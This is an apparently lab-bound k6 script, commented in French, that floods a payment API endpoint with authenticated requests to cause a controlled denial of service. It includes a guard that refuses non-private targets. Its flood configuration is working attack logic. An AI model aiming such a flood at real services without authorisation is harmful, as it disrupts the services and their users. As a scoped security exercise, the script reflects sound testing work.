// Scénario principal : déni de service applicatif contrôlé sur POST /api/payments.
// Exécuté depuis le PC Attaquant avec k6 :  k6 run -e TARGET=http://192.168.137.1:8080 dos.js
//
// GARDE-FOU DE PÉRIMÈTRE (cf. dossier §3.4 et §9) : le script REFUSE toute cible
// en dehors du SI fictif du groupe. Aucune action hors de cette liste.
import http from "k6/http";
import { check, sleep } from "k6";

const TARGET = __ENV.TARGET || "http://192.168.137.1:8088";

// Garde-fou : cible sur un réseau PRIVÉ uniquement (LAN / Tailscale / localhost).
// On n'autorise aucune cible publique Internet -> pas de tir accidentel sur un tiers.
const host = (TARGET.split("//")[1] || "").split(":")[0].split("/")[0];
const isPrivate =
  host === "localhost" || host === "waf" ||
  /^127\./.test(host) || /^10\./.test(host) || /^192\.168\./.test(host) ||
  /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(host) ||
  /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(host);   // Tailscale (CGNAT 100.64/10)
if (!isPrivate) {
  throw new Error(
    `Cible '${host}' non autorisée. Réseau privé uniquement (LAN, Tailscale, localhost). ` +
    `Les tests offensifs sont limités à votre propre SI.`
  );
}

export const options = {
  scenarios: {
    flood: {
      executor: "ramping-vus",
      startVUs: 0,
      stages: [
        { duration: "20s", target: 50 },   // montée
        { duration: "60s", target: 200 },  // charge soutenue -> saturation attendue
        { duration: "20s", target: 0 },    // arrêt
      ],
      gracefulRampDown: "5s",
    },
  },
  // On n'interrompt pas sur les erreurs : les 5xx/429 sont le signal recherché.
  thresholds: {},
};

// Un seul login au démarrage (les écritures authentifiées chargent plus l'API).
let token = "";
export function setup() {
  const r = http.post(`${TARGET}/auth/login`,
    JSON.stringify({ username: "demo", password: "demo1234" }),
    { headers: { "Content-Type": "application/json" }, timeout: "3s" });
  if (r.status === 200) return { token: r.json("access_token") };
  return { token: "" };
}

export default function (data) {
  const headers = { "Content-Type": "application/json" };
  if (data.token) headers["Authorization"] = `Bearer ${data.token}`;
  const res = http.post(`${TARGET}/api/payments`,
    JSON.stringify({ amount_cents: 1299, currency: "EUR" }),
    { headers, timeout: "3s" });
  check(res, { "pas de 5xx": (r) => r.status < 500 });
  sleep(0.05);
}
